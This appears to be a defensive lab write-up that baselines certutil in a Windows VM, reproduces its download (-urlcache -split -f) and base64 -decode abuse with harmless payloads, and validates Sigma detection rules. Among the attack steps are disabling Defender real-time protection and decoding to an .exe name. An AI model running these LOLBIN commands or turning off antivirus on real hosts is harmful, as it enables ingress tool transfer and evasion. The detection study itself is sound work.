# Lab Notes: certutil LOLBIN Baselining

## Environment
- **Host:** VirtualBox
- **Guest:** Windows 10 VM (isolated lab)
- **Telemetry:** Sysmon v15.22 (schema 4.91), scoped config `sysmon-certutil.xml`
  - EID 1 (ProcessCreate), EID 3 (NetworkConnect), EID 11 (FileCreate), all filtered to `certutil.exe`
- **Snapshots:** `clean` (fresh OS), `sysmon-ready` (Sysmon installed + validated)
- **Run A date:** 10/13/2026

---

## Run A: Legitimate baseline

### Commands executed (all from an elevated PowerShell session)

| # | Time | Command line | Parent process | EID 3 (network) | EID 11 (file write) |
|---|---|---|---|---|---|
| 1 | 7:18:57 PM | `certutil.exe -store My` | powershell.exe | None | None |
| 2 | 7:19:09 PM | `certutil.exe -store Root` | powershell.exe | None | None |
| 3 | 7:19:35 PM | `certutil.exe -hashfile C:\Windows\System32\notepad.exe SHA256` | powershell.exe | None | None |
| 4 | 7:20:59 PM | `certutil.exe -generateSSTFromWU C:\Lab\roots.sst` | powershell.exe | **Yes**: 93.123.17.252 at 7:21:02 (hostname not resolved) | **Yes**: `C:\Lab\roots.sst` at 7:21:08 |

### Observations

1. **Parent lineage is normal.** All four executions were launched by `powershell.exe` from an interactive admin session. This is the expected shape for legitimate administrative use.

2. **Core certificate/hash operations are purely local.** Commands 1–3 produced only a process-creation event (EID 1). No network activity, no files written. This is the "quiet" profile of certutil doing its real job.

3. **Key finding: legitimate certutil can behave like a downloader.** Command 4 (`-generateSSTFromWU`) produced the full sequence:
   - EID 1: process start (7:20:59)
   - EID 3: outbound connection to 93.123.17.252 (~3 seconds later)
   - EID 11: file written to `C:\Lab\roots.sst` (~6 seconds after the connection)

   This is the same *shape* of activity expected from download abuse in Run B: start, connect out, drop a file. **Network activity plus a file write is not, on its own, evidence of malicious use.** Detection has to account for *which verbs* were used and *where* certutil connected.

4. **Sysmon could not name the destination.** `DestinationHostname` was `-`, meaning Sysmon's reverse lookup of the IP returned nothing. This is common for CDN-hosted services like Windows Update. An analyst looking at EID 3 alone would see an unexplained connection to a bare IP. Attribution requires enrichment from another source: DNS query logging (Sysmon EID 22), the host's DNS cache, proxy logs, or threat intel.
   - An attempt to attribute the IP via the host DNS cache (`Get-DnsClientCache`) failed: neither 93.123.17.252 nor the IP from a repeat run (199.232.214.172) was present. CDN records have very short TTLs, so the cache had already expired. **The DNS cache is volatile evidence.**
   - Two identical, legitimate runs connected to two different IPs. **IP-based allow-listing of Windows Update is not viable**; allow-listing must be done by hostname. Resolved by adding DNS query logging (see Config v2 below).

5. **Unexpected noise: Event ID 5 (process terminated).** The log contained many EID 5 events, mostly for processes other than certutil. The config did not define any `ProcessTerminate` rule, and Sysmon logs some event types by default when they are left unconfigured. **Lesson:** an event type you didn't configure isn't necessarily silent. These were filtered out of the analysis. (Screenshot 03: the log held 196 events after a few minutes, mostly EID 5 for unrelated processes such as `wlrmdr.exe`, `sppsvc.exe`, and `dllhost.exe`.)

6. **The legitimate download used plain HTTP.** The EID 3 for `-generateSSTFromWU` shows `DestinationPort: 80`, `DestinationPortName: http` (screenshot 10). This explains why Run A produced no certificate-revocation lookups while the HTTPS download in Run B did: with no TLS certificate to validate, there was nothing to check.

7. **EID 1 carries identity fields beyond the file name.** Each process-creation event includes `OriginalFileName: CertUtil.exe` (the name embedded in the binary) and a SHA256 hash (screenshot 03). These survive renaming the file, which matters for the renamed-binary limitation discussed in Phase 4. All tests ran at `IntegrityLevel: High` (elevated admin); certutil's abuse functions also work unelevated.

### Draft detection implications
- **Command-line verbs are the primary differentiator.** `-store`, `-hashfile`, and `-generateSSTFromWU` are benign administrative verbs; `-urlcache`, `-f`, `-split`, `-decode`, and `-encode` warrant scrutiny.
- **Destination matters more than the fact of a connection.** Connections to Microsoft update/PKI infrastructure are expected; connections to arbitrary hosts are not. Candidate for an allow-list.
- **Correlate events.** EID 1, 3, and 11 from the same certutil execution share a `ProcessGuid`, so they can be joined into a single story rather than evaluated as isolated alerts.

---

## Config v2: adding DNS query logging

**Why:** Run A showed that EID 3 alone could not attribute certutil's connection (bare IP, failed reverse lookup, expired DNS cache).

**Changes (`sysmon-certutil-v2.xml`, applied live with `Sysmon64.exe -c`):**
- Added **EID 22 (DnsQuery)** filtered to certutil: records the hostname certutil resolved and the IPs returned.
- Added **EID 5 (ProcessTerminate)** filtered to certutil: removes the system-wide process-exit noise seen in Run A.

### Validation run: `certutil -generateSSTFromWU C:\Lab\roots3.sst` (10/13/2026, 7:42 PM)

| EID | What it recorded |
|---|---|
| 1 | certutil started with `-generateSSTFromWU`, parent `powershell.exe` |
| 22 | Query for **`ctldl.windowsupdate.com`** → CNAME chain `ctldl.windowsupdate.com.delivery.microsoft.com` → `wu-b-net.trafficmanager.net` → `bg.microsoft.map.fastly.net` → IPs incl. **184.27.197.16**, 184.27.197.83 |
| 3 | Connection to **184.27.197.16** (reverse lookup: `a184-27-197-16.deploy.static.akamaitechnologies.com`) |
| 11 | File written: `C:\Lab\roots3.sst` |
| 5 | certutil exited |

### Findings

1. **Attribution achieved.** The EID 3 destination IP matches an IP in the EID 22 query results, proving the connection went to Windows Update's certificate distribution host. Unlike the DNS cache, this evidence is permanent.

2. **Reverse DNS identifies the provider, not the service.** Sysmon's reverse lookup on EID 3 returned an Akamai hostname, which reveals nothing about Windows Update. Only the process's own forward DNS query (EID 22) showed the real destination.

3. **Log write time is not event time.** Sorted by `TimeCreated`, the events appeared out of order (EID 5 "process exited" before EID 22/3 network activity, which is impossible). Network and DNS events reach Sysmon through a slower pipeline and are written to the log late. **Timelines must be built from each event's `UtcTime` field, not `TimeCreated`.**
   - **Confirmed.** Sorted by UtcTime: EID 1 (40.102) → EID 22 (40.160, +58 ms) → EID 3 (40.176, +16 ms) → EID 11 and EID 5 (both 41.719). Whole execution ≈ 1.6 seconds. The EID 3 event was written to the log ~3 seconds after the connection occurred.

4. **The CDN chain itself shows why IP allow-lists fail.** A single hostname resolved through Microsoft's delivery network, a traffic manager, and a third-party CDN, to multiple IPs that change between runs. Stable identity lives at the hostname level.

---

_Screenshots: see the Screenshot index at the end._

---

## Run B: Download abuse (T1105, Ingress Tool Transfer)

**Command:** `certutil -urlcache -split -f https://www.example.com/ C:\Lab\downloaded.html`
- `-urlcache`: certutil's URL cache feature, which fetches any URL given to it
- `-split`: write the fetched content to a file
- `-f`: force the download even if cached
- Payload: the harmless `example.com` page, standing in for an attacker's tool

### Part 1: Microsoft Defender real-time protection ON (10/13/2026, 7:51 PM)

**Result: blocked.**

**Defender log (`Microsoft-Windows-Windows Defender/Operational`):**
| Time | EID | Detail |
|---|---|---|
| 7:51:09 PM | 1116 (detected, logged twice) | `Trojan:Win32/Ceprolad.A`, severity Severe, category Trojan |
| 7:51:21 PM | 1117 (action taken) | Action: Remove, completed successfully |

- **Detection target was the command line, not a file.** The `Path` field reads `CmdLine:_C:\Windows\System32\certutil.exe -urlcache -split -f https://www.example.com/ C:\Lab\downloaded.html`. The downloaded content was harmless; Defender judged the behavior.
- `Process Name: Unknown` and `User: NT AUTHORITY\SYSTEM` (Defender's own context), so the record does not identify the parent process or the user who launched the attempt.

**Sysmon log: no certutil events at all.** No EID 1, 22, 3, 11, or 5 for the attempt.

**Ruling out a Sysmon failure before drawing conclusions:**
- The log contained two EID 255 errors (`GetConfigurationOptions`, error 94, "media is write protected") at 23:48:23 UTC. These occurred during a VM reboot, before Sysmon restarted (EID 4, "Started", at 23:49:14 UTC). Not related to the test.
- `Sysmon64.exe -c` confirmed the v2 config was active, with all five rules (ProcessCreate, ProcessTerminate, NetworkConnect, FileCreate, DnsQuery).
- **Canary test:** `certutil -hashfile C:\Windows\System32\notepad.exe SHA256` at 23:55:48 UTC was logged normally (EID 1 with full command line and parent `powershell.exe`, then EID 5).

**Conclusion:** Sysmon was healthy and correctly configured. Defender blocked certutil at launch, so no process ever existed for Sysmon to record.

**Direct confirmation:** PowerShell reported `Program 'certutil.exe' failed to run: Access is denied` (screenshot 16). The operating system refused to start the process, which matches the absence of any Sysmon event.

**Duplicate detection explained:** Windows Security's protection history (screenshot 17) lists two affected items for the single attempt: the command line, and a second form with the certutil path repeated (`C:\Windows\System32\certutil.exe C:\Windows\system32\certutil.exe -urlcache ...`). Defender likely recorded the attempt in two forms, which accounts for the two EID 1116 events. The page also describes the threat as a program that executes commands from an attacker.

### Part 1 findings

1. **Behavior-based prevention works on LOLBIN abuse.** Defender blocked the download based on the command-line pattern alone, regardless of payload.
2. **When prevention wins at launch, Sysmon is blind to the attempt.** The Defender log is the only evidence that the attack was tried.
3. **The two sources complement each other.** Defender captured the command line but not the parent process or real user; Sysmon normally captures both. Neither source alone tells the full story.
4. **A blocked attempt is still an incident signal.** It indicates someone with execution on the host attempting tool transfer, and likely to try variations. Defender EID 1116/1117 must be ingested and alerted on alongside Sysmon.

### Part 2: Defender real-time protection OFF (10/14/2026, 00:01 UTC)

**Result: download succeeded.** `C:\Lab\downloaded.html` contained the example.com page HTML.

**Full Sysmon timeline (sorted by UtcTime, all within 00:01:46):**

| UtcTime | EID | Detail |
|---|---|---|
| .375 | 1 | `certutil.exe -urlcache -split -f https://www.example.com/ C:\Lab\downloaded.html`, parent `powershell.exe` |
| .422 | 22 | Query `www.example.com` → 104.20.23.154, 172.66.147.243 (+ IPv6), Cloudflare |
| .428 | 3 | Connection to 104.20.23.154 (no reverse hostname) |
| .521 | 11 ×2 | `CryptnetUrlCache\MetaData\447E75DA...` and `CryptnetUrlCache\Content\447E75DA...` |
| .557 | 3 | **Second** connection to 104.20.23.154 |
| .618 | 22 | Query `ocsp.comodoca.com` → CNAME `ocsp.comodoca.com.cdn.cloudflare.net` → 104.18.38.233, 172.64.149.23 |
| .625 | 3 | Connection to 104.18.38.233 |
| .674 | 11 ×2 | `CryptnetUrlCache\Content` + `MetaData` `B2FAF769..._46BFDFDC...` |
| .698 | 22 | Query `crls.ssl.com` → CloudFront IPs incl. 108.159.46.107 |
| .723 | 3 | Connection to 108.159.46.107 (reverse: `server-108-159-46-107.pnq50.r.cloudfront.net`) |
| .795–.851 | 11 ×4 | `CryptnetUrlCache` Content + MetaData pairs `84AE6690...` and `02460F0C...` |
| .896 | 11 ×3 | `INetCache\IE\3HNQU6BD\` directory, `INetCache\IE\3HNQU6BD\GV090ID1.htm`, and **`C:\Lab\downloaded.html`** |
| .896 | 5 | certutil exited |

Whole execution ≈ 0.52 seconds.

### Part 2 findings

1. **The complete download-abuse chain is visible:** process start → DNS lookup of the URL's host → connection → file written to the attacker-chosen path → exit.

2. **Same shape as the legitimate Run A download; the differences are in the details:**
   | | Run A (`-generateSSTFromWU`) | Run B (`-urlcache -split -f`) |
   |---|---|---|
   | Verbs | certificate-management verb | URL-fetch verbs with an explicit URL |
   | First DNS query | `ctldl.windowsupdate.com` (Microsoft) | `www.example.com` (arbitrary host) |
   | Output | one `.sst` file | user-chosen file **plus** 11 cache artifacts |

3. **HTTPS triggered extra, legitimate-looking traffic.** certutil also contacted `ocsp.comodoca.com` and `crls.ssl.com`, certificate revocation checks on the site's TLS certificate. A rule like "certutil connected to a non-Microsoft host" would also hit these PKI endpoints, which appear in legitimate certificate validation too. **The precise signal is the hostname in the command-line URL matching the first EID 22 query.** The remaining lookups are revocation-checking noise.

4. **Forensic artifacts outside the payload path.** certutil wrote copies/records to `AppData\LocalLow\Microsoft\CryptnetUrlCache\` (Content + MetaData pairs) and `AppData\Local\Microsoft\Windows\INetCache\IE\` (`.htm` copy). These persist even if the attacker deletes the payload. Run A wrote one file; Run B wrote twelve.
   - Note: legitimate certificate checks also cache revocation data in CryptnetUrlCache, so the INetCache `.htm` write may be the more distinctive indicator. Worth testing against more legitimate usage.

5. **Two connections to the payload host** (.428 and .557). DFIR write-ups commonly report that certutil downloads issue two HTTP requests with different user-agent strings, a potential network-side detection. Not verifiable from Sysmon alone.

6. **Reverse DNS again told us nothing useful** (`-` for Cloudflare, a CloudFront server name for the CRL host). EID 22 provided the real attribution every time.

### Part 2 follow-up checks

- **`certutil -urlcache *` (screenshot 25):** confirmed `https://www.example.com/` as a cached entry. certutil itself keeps a record of past downloads, which an incident responder can enumerate.
  - **The URL appears twice: once in the WinINet cache (12 entries) and once in the WinHTTP cache (29 entries).** These are two separate Windows networking components. This is consistent with the other Run B evidence: two connections to the payload IP (.428 and .557), and copies written to two locations (`INetCache`, used by WinINet, and `CryptnetUrlCache`, used by the certificate subsystem over WinHTTP). certutil appears to fetch the URL through both, which also fits the commonly reported "two requests, two user agents" behavior (user agents are not visible in Sysmon).
  - **The cache is shared and noisy.** It also contains Windows' own certificate traffic (OCSP and CRL URLs from DigiCert, Amazon Trust, GlobalSign, Let's Encrypt, Microsoft, and `ctldl.windowsupdate.com` trust-list `.cab` files) and the lab account's browser cookies and visited pages. Entries are not necessarily created by certutil.
  - **Hunting technique:** among dozens of PKI URLs, `https://www.example.com/` was the only non-certificate host. Listing the cache and filtering out OCSP, CRL, and Windows Update URLs leaves a short list worth investigating.
- **Event correlation (screenshots 23–24):** the EID 1 (process create) and EID 22 (DNS query for `www.example.com`, `QueryStatus: 0`) share `ProcessGuid {d6b2a157-c66a-6ace-cf00-000000000b00}`, which is how events from one execution are joined.

- **Defender state changes (`Microsoft-Windows-Windows Defender/Operational`):**
  | Local time | EID | Meaning |
  |---|---|---|
  | 8:01:25 PM | 5001 | Real-time protection **disabled** |
  | 8:01:46 PM (00:01:46 UTC) | — | certutil download executes (Sysmon EID 1) |
  | 8:04:18 PM | 5000 | Real-time protection re-enabled |

  **Finding: protection was disabled 21 seconds before the download.** "AV disabled, then a LOLBIN fetches a file within seconds" is a classic attacker sequence. Each event alone may have an innocent explanation; together they make a high-confidence correlation rule: *Defender EID 5001 followed by certutil network activity (Sysmon EID 3/22) on the same host within a short window.*

_Screenshots: see the Screenshot index at the end._

## Run C: Base64 decode abuse (T1140, Deobfuscate/Decode Files or Information)

**Scenario:** an attacker delivers a payload as base64 text to slip past network content inspection, then decodes it on the victim host with certutil.

**Setup (attacker-side prep, simulated on the VM):**
- `Set-Content C:\Lab\secret.txt "This is a harmless test string for the lab."` (written by PowerShell, so not logged by the certutil-scoped config)
- `certutil -encode C:\Lab\secret.txt C:\Lab\secret.b64`
- **Observation:** certutil wraps base64 output in `-----BEGIN CERTIFICATE-----` / `-----END CERTIFICATE-----` markers regardless of content. An encoded payload looks like an ordinary certificate file at a glance.
- Sysmon log cleared after encoding, so the captured telemetry reflects only the victim-side decode.

**Environment change:** Defender security intelligence updated at 6:42:52 PM local on 10/14/2026, two minutes before Run C: AV/AS `1.459.691.0` → `1.461.28.0`, engine `1.1.26080.3` → `1.1.26090.9`. Run B and Run C were tested against different Defender versions.

### Decode to `.txt` (10/14/2026, 22:44:57 UTC)

| UtcTime | EID | Detail |
|---|---|---|
| 57.064 | 1 | `certutil.exe -decode C:\Lab\secret.b64 C:\Lab\decoded.txt`, parent `powershell.exe` |
| 57.072 | 11 | `C:\Lab\decoded.txt` written |
| 57.072 | 5 | certutil exited |

Execution ≈ 8 ms. **No EID 22, no EID 3.**

### Variant: decode to `.exe`

`certutil -decode C:\Lab\secret.b64 C:\Lab\update.exe`
- Completed successfully: `Input Length = 118`, `Output Length = 45` (45 bytes = the original 43-character sentence plus CRLF, confirming the decoded content was the harmless text).
- **Defender: no detection.** No EID 1116 or 1117; the only recent Defender events were the definition updates.
- Sysmon (22:46:51 UTC): EID 1 `certutil.exe -decode C:\Lab\secret.b64 C:\Lab\update.exe` (parent `powershell.exe`) at .829, then EID 11 **`C:\Lab\update.exe`** and EID 5 at .837. Execution ≈ 8 ms.
- **The EID 11 event is the key detection hook:** certutil, a certificate tool, created a file with an executable extension.

### Run C findings

1. **The decode is invisible to network monitoring.** No DNS and no connections; proxies, firewalls, and network sensors see nothing. Only endpoint telemetry (Sysmon EID 1 + 11) captures it.

2. **Prevention coverage is uneven.** Defender blocked the download instantly (Run B) but did not react to the decode, even when the output was named `.exe`. This is the gap a custom detection must cover.

3. **Scope of the finding (stated honestly):** the decoded content was harmless text. A real malicious payload would likely be caught by Defender's ordinary scan when the file is written, *if Defender recognizes it*. What this run proves is that **the decode behavior itself, including decode-to-executable, is not blocked.** A payload Defender does not recognize would pass.

4. **Strong detection signals for this technique:**
   - EID 1: certutil command line containing `-decode` (rare in normal administration)
   - EID 11: certutil writing a file with an executable or script extension (`.exe`, `.dll`, `.ps1`, `.bat`, `.vbs`, etc.); certutil has little legitimate reason to create these

5. **Encoded payloads masquerade as certificates.** The certificate markers certutil adds make a staged payload blend in with legitimate PKI files.

---

## Comparison: legitimate vs. abuse

| Signal | Run A: legit (`-store`, `-hashfile`) | Run A: legit download (`-generateSSTFromWU`) | Run B: download abuse (`-urlcache -split -f`) | Run C: decode abuse (`-decode`) |
|---|---|---|---|---|
| Command-line verbs | certificate/hash verbs | certificate-management verb | URL-fetch verbs + explicit URL | decode verb |
| Parent process | powershell.exe | powershell.exe | powershell.exe | powershell.exe |
| EID 22 (DNS) | none | `ctldl.windowsupdate.com` (Microsoft) | `www.example.com` (arbitrary host), then OCSP/CRL hosts | none |
| EID 3 (network) | none | Microsoft CDN | payload host ×2, plus OCSP/CRL hosts | none |
| EID 11 (files) | none | 1 (`.sst`) | 12 (payload + CryptnetUrlCache + INetCache artifacts) | 1 (decoded output, any extension) |
| Defender | no action | no action | **Blocked** (`Trojan:Win32/Ceprolad.A`, command-line detection) | **No action**, even for `.exe` output |
| Duration | — | ≈ 1.6 s | ≈ 0.5 s | ≈ 8 ms |
| ATT&CK | — | — | T1105 | T1140 |

**Key differentiators:**
- **Command-line verbs** separate every abuse case from every legitimate case in this lab.
- **"Network + file write" is not enough on its own:** the legitimate Windows Update run did both.
- **Destination identity comes from EID 22, not EID 3.** Match the host in the command-line URL to the first DNS query.
- **Artifact count and location** (cache files under the user profile) distinguish the abusive download from the legitimate one.
- **The decode case has no network footprint and was not blocked by Defender**, so it relies entirely on endpoint detection.

_Screenshots: see the Screenshot index at the end._

---

## Phase 4: Detection rules and validation

### Rules (Sigma, in `detections/`)

| Rule | Log source | Logic | Level | ATT&CK |
|---|---|---|---|---|
| **R1** Certutil download | process_creation (EID 1) | certutil **and** command line contains `urlcache` or `verifyctl` **and** `http://` or `https://` | high | T1105 |
| **R2** Certutil decode | process_creation (EID 1) | certutil **and** command line contains `-decode` or `/decode` | medium | T1140 |
| **R3** Certutil wrote executable | file_event (EID 11) | certutil created a file ending in `.exe`, `.dll`, `.ps1`, `.bat`, `.cmd`, `.vbs`, `.js`, `.hta`, `.scr` | high | T1105, T1140 |

Each rule maps directly to a differentiator in the comparison table. R3 is behavior-based: it ignores the command line and fires on what lands on disk.

**Validation method:** `detect-certutil.ps1` replays the R1–R3 logic against the local Sysmon log (parsing event fields by name from XML), lists every certutil execution with its verdict, and links file events to their process via `ProcessGuid`.

### Test battery (10/14/2026, 23:00 UTC; Defender real-time protection off for the run)

| # | Command | Expected | Result |
|---|---|---|---|
| L1 | `certutil -store My` | no alert | ✅ no alert |
| L2 | `certutil -hashfile C:\Windows\System32\notepad.exe SHA256` | no alert | ✅ no alert |
| L3 | `certutil -generateSSTFromWU C:\Lab\roots.sst` | no alert | ✅ no alert |
| B1 | `certutil -urlcache -split -f https://www.example.com/ C:\Lab\t1.html` | R1 | ✅ R1 |
| B2 | `certutil /URLCACHE /split /f https://www.example.com/ C:\Lab\t2.html` | R1 | ✅ R1 |
| C1 | `certutil -decode C:\Lab\secret.b64 C:\Lab\t3.txt` | R2 | ✅ R2 |
| C2 | `certutil -decode C:\Lab\secret.b64 C:\Lab\t4.exe` | R2 + R3 | ✅ R2 (23:00:51.398) + R3 (`C:\Lab\t4.exe`, 23:00:51.406) |

**Result: 7/7 correct. 3 true negatives, 4 true positives, 0 false positives, 0 false negatives.**

### Findings

1. **The legitimate download stayed quiet.** L3 connects out and writes a file, yet triggered nothing, because the rules key on the verbs and URL, not on "network + file."
2. **The evasion variant was caught.** certutil accepted slash-prefixed, uppercase verbs (`/URLCACHE`); R1 still fired because it matches the verb as a case-insensitive substring rather than one exact spelling.
3. **Independent signals corroborate.** On C2, R2 fired at process start and R3 fired 8 ms later when the payload hit disk, both linked to the same `ProcessGuid`. Two rules agreeing on one execution raises confidence for escalation.

### Limitations

1. **Small battery.** Three legitimate commands do not represent a production baseline. Real false-positive rates require testing against sustained enterprise telemetry (installers, management agents, admin scripts).
2. **Renamed binary blind spot (lab only).** The scoped Sysmon config filters on `Image` = `certutil.exe`, so a renamed copy of certutil would not be logged and all three rules would miss it. The Sigma rules also match `OriginalFileName` to cover this in production, but that path was not tested here.
3. **R3 can be sidestepped.** Decoding to a benign extension and renaming the file afterward with another tool avoids R3. R2 still catches the decode, which is why the rules are layered.
4. **Command-line rules are inherently evadable** through obfuscation; R3's behavior-based approach is the more durable layer.

---

## Screenshot index

### Batch 1 (confirmed)

| # | File | Shows | Write-up section |
|---|---|---|---|
| 01 | `01-sysmon-config-v1.jpg` | Scoped Sysmon config v1 | Lab setup |
| 02 | `02-sysmon-installed.jpg` | Sysmon install output, service Running | Lab setup |
| 03 | `03-smoke-test-eventviewer.jpg` | First certutil EID 1 with full fields (OriginalFileName, hash, parent); EID 5 noise | Lab setup / limitations |
| 04 | `04-runA-store-commands.jpg` | `-store My`, `-store Root` | Run A |
| 05 | `05-runA-hashfile.jpg` | Root store output, `-hashfile` result | Run A |
| 06 | `06-runA-generateSSTFromWU.jpg` | Legitimate download command | Run A |
| 07 | `07-runA-summary.jpg` | Run A event summary with EID 5 noise | Run A |
| 08 | `08-runA-eid11-roots-sst.jpg` | Event Viewer: EID 11 `roots.sst` | Run A |
| 09 | `09-runA-eid1-hashfile.jpg` | Event Viewer: EID 1 `-hashfile` | Run A |
| 10 | `10-runA-eid3-windowsupdate.jpg` | Event Viewer: EID 3, port 80/http, bare IP | Run A |
| 11 | `11-dns-cache-miss.jpg` | Two runs, two IPs, neither in DNS cache | Config v2 rationale |
| 12 | `12-sysmon-config-v2.jpg` | Config v2 contents | Config v2 |
| 13 | `13-config-v2-applied.jpg` | `Configuration updated` | Config v2 |
| 14 | `14-runA-dns-attribution.jpg` | EID 22 query results match EID 3 IP | Config v2 |
| 15 | `15-utctime-vs-timecreated.jpg` | Out-of-order TimeCreated vs. correct UtcTime | Config v2 |
| 16 | `16-runB-defender-block.jpg` | "Access is denied" + Threats found toast | Run B Part 1 |
| 17 | `17-runB-defender-protection-history.jpg` | Ceprolad.A detail, two affected items | Run B Part 1 |
| 18 | `18-runB-defender-log.jpg` | Defender EID 1116 ×2, 1117 | Run B Part 1 |
| 19 | `19-runB-sysmon-health-check.jpg` | EID 255/4, `Sysmon64 -c`, canary test | Run B Part 1 |
| 20 | `20-runB-download-success.jpg` | Download succeeds, Defender off | Run B Part 2 |

**Strongest images for the write-up:** 10 (legit download over HTTP to a bare IP), 14 (DNS attribution), 16 (blocked at launch), 17 (Defender's verdict).

### Batch 2 (confirmed)

| # | File | Shows | Write-up section |
|---|---|---|---|
| 21 | `21-runB-payload-landed.jpg` | Download + contents of `downloaded.html` | Run B Part 2 |
| 22 | `22-runB-summary.jpg` | Full Run B timeline sorted by UtcTime | Run B Part 2 |
| 23 | `23-runB-eid1-eventviewer.jpg` | Event Viewer: EID 1 abusive command line | Run B Part 2 |
| 24 | `24-runB-eid22-example-com.jpg` | Event Viewer: EID 22 `www.example.com`, same ProcessGuid | Run B Part 2 |
| 25 | `25-runB-urlcache-artifact.jpg` | `certutil -urlcache *`: URL in WinINet and WinHTTP caches | Run B Part 2 / forensics |
| 26 | `26-runB-defender-disabled-event.jpg` | Defender 5001 (8:01:25) / 5000 (8:04:18) | Run B Part 2 |
| 27 | `27-runC-b64-fake-certificate.jpg` | `-encode` output wrapped in certificate markers | Run C |
| 28 | `28-runC-decode-command.jpg` | `-decode` + original sentence recovered | Run C |
| 29 | `29-runC-summary.jpg` | Run C timeline: EID 1, 11, 5, no network | Run C |
| 30 | `30-runC-variant-exe-defender.jpg` | Decode to `update.exe`; Defender log shows only definition updates | Run C |
| 31 | `31-runC-variant-exe-sysmon.jpg` | EID 11 `C:\Lab\update.exe` | Run C |
| 32 | `32-battery-commands.jpg` | All 7 test-battery commands succeeding | Phase 4 |
| 33 | `33-detection-results.jpg` | Detector output: 7/7 verdicts and alert list | Phase 4 |

**Strongest images in batch 2:** 22 (full attack chain), 25 (cache artifact), 29 vs. 22 (decode has no network footprint), 33 (validated detection).

**Set complete: 33 screenshots, no gaps.**
